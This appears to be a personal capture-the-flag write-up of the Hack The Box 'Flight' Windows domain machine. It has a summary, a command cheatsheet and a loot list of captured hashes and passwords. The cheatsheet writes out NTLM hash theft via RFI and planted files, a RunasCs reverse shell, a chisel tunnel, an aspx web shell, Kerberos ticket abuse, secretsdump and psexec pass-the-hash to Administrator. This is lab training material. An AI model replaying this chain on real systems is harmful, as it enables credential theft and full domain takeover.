# Flight \[Hard]

## Report

An HTTP website 'school.flight.htb' is vulnerable to RFI, trying to access a file on SMB share revelas NTLMv2 creds for 'svc\_apache'. Password spraying after cracking the hash shows same password used by 'S.Moon' who can write to 'Shared' SMB share. We compile and upload files that steal NTLM creds and responder gets a hit after a while, thus cracking password for C.Bum who has write access to 'Web' directory.

Upload a reverse shell to get shell as 'svc\_apache' and use RunasCs to spawn another shell as C.Bum. Browsing the web server directory we see 'development' and C.Bum has write access to it using icalcs. netstat shows port 8000 being open and a port forward using chisel shows an IIS website. Drop an aspx web shell and spawn another shell to become 'defaultapppool' - a virtual account with no real creds, it authenticates as the system itself. This account also has SeImpersonatePrivilege but no password, so we generate a krb ticket and use it for secretsdump.py auth and get NTLM hash for Administrator.

## Cheatsheet

{% code overflow="wrap" %}
```
clock-skew: 7h00m07s
Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m
which version of windows could be running?

school.flight.htb
index.php taking view input - can view local files
http://school.flight.htb/index.php?view=C:/Windows/System32/drivers/etc/hosts
RFI also possible but no code execution
use RFI to access file in our SMB share, intercept NTLMv2 hash (MSSQL tactics)

Get creds for svc_apache

PASSWORD SPRAY after enumerating users with that of svc_apache
s.moon can write to Shared SMB Folder
Steal NTLM hashes by writing files that hit our share
How we know someone will click on it tho? HAHAHAHAHA good luck mate

python ntlm_theft.py -g all -s 10.10.14.9 -f jtripz
#Creates files that try to access share in our IP if clicked on

Get creds for c.bum
C.Bum can write to Web SMB share, drop a revshell and get shell as svc_apache

SHELL AS svc_apache
I have C.Bum password already, use RunasCs to spawn new shell as C.Bum
.\R.exe "C.Bum" 'Tikkycoll_431012284' powershell.exe -r 10.10.14.9:8050

SHELL AS c.bum
netstat -ano shows an open port at 8000, wasnt open but not restricted to localhost either anyways set a tunnel using chisel
in inetpub, theres another folder 'development' where C.Bum has write perms
icalcs "Path"

chisel server -p 8000 --reverse
.\c.exe client 10.10.14.9:8000 R:8001:127.0.0.1:8000
drop shell.aspx with write privs as c.bum in development
http://127.0.0.1:8001/shell.aspx
/c powershell -e [encoded rev shell]

SHELL AS defaultapppool
has SeImpersonatePrivilege
PS C:\programdata> .\rubeus.exe tgtdeleg /nowrap

[*] Action: Request Fake Delegation TGT (current user)
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/g0.flight.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Extracted the service ticket session key from the ticket cache: msdoS/nlu8Wkdi3i6WPxvUpJH2SaN+Eru8AG82pOLUk=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

base64 -d ticket.kirbi > ticket.kirbi_b64
python3 ticketConverter.py ~/htb/rooms/flight/ticket.kirbi_b64 ~/htb/rooms/flight/ticket.ccache

export KRB5CCNAME=~/htb/rooms/flight/ticket.ccache
faketime -f '+7h' sudo python3 secretsdump.py -k -no-pass g0.flight.htb -just-dc-user administrator
python3 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c Administrator@10.10.11.187 cmd.exe
```
{% endcode %}

## Loot

### Creds

```
svc_apache::flight:d57b76c34510e8a5:A00D8801096092A5BB9C59AE90C8200D:010100000000000000CC81244B19DC016FD0156DEC4F507C0000000002000800560046004E00540001001E00570049004E002D004D004B004400460034004F0030004C0035004F00580004003400570049004E002D004D004B004400460034004F0030004C0035004F0058002E00560046004E0054002E004C004F00430041004C0003001400560046004E0054002E004C004F00430041004C0005001400560046004E0054002E004C004F00430041004C000700080000CC81244B19DC01060004000200000008003000300000000000000000000000003000000FE3C2612832D3DC383F57E48451DA6822EB3AE6D5607135836357881373A6780A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0039000000000000000000 
svc_apache:S@Ss!K@*t13

s.moon:S@Ss!K@*t13 [Password Spray afer rid enumeration]

c.bum::flight.htb:2e6e2726c10614d3:9242B27D16EA31A31AC1085F5FB3D79F:010100000000000000390C995219DC014C4F2DAF940D1547000000000200080031004D005600360001001E00570049004E002D00430037004E004B0048004D00420048004E003600540004003400570049004E002D00430037004E004B0048004D00420048004E00360054002E0031004D00560036002E004C004F00430041004C000300140031004D00560036002E004C004F00430041004C000500140031004D00560036002E004C004F00430041004C000700080000390C995219DC01060004000200000008003000300000000000000000000000003000000FE3C2612832D3DC383F57E48451DA6822EB3AE6D5607135836357881373A6780A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0039000000000000000000
c.bum:Tikkycoll_431012284

2dca73352f53c6ad457efddf0120469c
15eaf9d45ec2a90d86536dd0a1b4529c
```

### Enumeration

```
HTTP
flight.htb school.flight.htb

SMB
guest acc disabled
svc_apache
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
SMB         10.10.11.187    445    G0               Shared          READ            
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ            
 
S.Moon can write to Shared too
C.Bum can write to Web - revshell time baby

Web - Nothing useful
Users - unless sum was there in svc_apache folder nah
  Administrator                       D        0  Mon Oct 31 14:34:00 2022
  All Users                       DHSrn        0  Sat Sep 15 03:28:48 2018
  C.Bum                               D        0  Thu Sep 22 16:08:23 2022
  Default                           DHR        0  Tue Jul 20 15:20:24 2021
  Default User                    DHSrn        0  Sat Sep 15 03:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018
  Public                             DR        0  Tue Jul 20 15:23:25 2021
  svc_apache                          D        0  Fri Oct 21 14:50:21 2022
                                                                                                         

RPC 
guest no privs
as svc_apache
index: 0xeda RID: 0x1f4 acb: 0x00004210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xfb5 RID: 0x647 acb: 0x00000210 Account: C.Bum  Name: (null)    Desc: Senior Web Developer
index: 0xfb8 RID: 0x64a acb: 0x00000210 Account: D.Truff        Name: (null)    Desc: Project Manager
index: 0xfb2 RID: 0x644 acb: 0x00000210 Account: G.Lors Name: (null)    Desc: Sales manager
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfb7 RID: 0x649 acb: 0x00000210 Account: I.Francis      Name: (null)    Desc: Nobody knows why he's here
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xfb3 RID: 0x645 acb: 0x00000210 Account: L.Kein Name: (null)    Desc: Penetration tester
index: 0xfb4 RID: 0x646 acb: 0x00000210 Account: M.Gold Name: (null)    Desc: Sysadmin
index: 0xfbb RID: 0x64d acb: 0x00000210 Account: O.Possum       Name: (null)    Desc: Helpdesk
index: 0xfb1 RID: 0x643 acb: 0x00000210 Account: R.Cold Name: (null)    Desc: HR Assistant
index: 0xfb0 RID: 0x642 acb: 0x00000210 Account: S.Moon Name: (null)    Desc: Junion Web Developer
index: 0xfba RID: 0x64c acb: 0x00000210 Account: svc_apache     Name: (null)    Desc: Service Apache web
index: 0xfb9 RID: 0x64b acb: 0x00000210 Account: V.Stevens      Name: (null)    Desc: Secretary
index: 0xfb6 RID: 0x648 acb: 0x00000210 Account: W.Walker       Name: (null)    Desc: Payroll officer
```
